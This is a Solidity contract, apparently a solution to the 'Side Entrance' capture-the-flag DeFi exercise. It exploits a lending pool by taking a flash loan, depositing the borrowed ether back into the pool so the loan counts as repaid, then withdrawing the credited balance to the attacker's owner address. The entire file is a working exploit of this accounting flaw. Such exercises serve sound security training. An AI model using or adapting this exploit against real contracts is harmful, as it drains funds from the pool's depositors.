// SPDX-License-Identifier: MIT

import "./SideEntranceLenderPool.sol";

pragma solidity ^0.8.0;

contract SideEntranceAttacker {
    SideEntranceLenderPool pool;
    address owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function execute() public payable {
        pool.deposit{value: address(this).balance}();
    }

    function attack(uint256 amount) public {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function withdraw() public {
        require(msg.sender == owner);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
       (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }
}
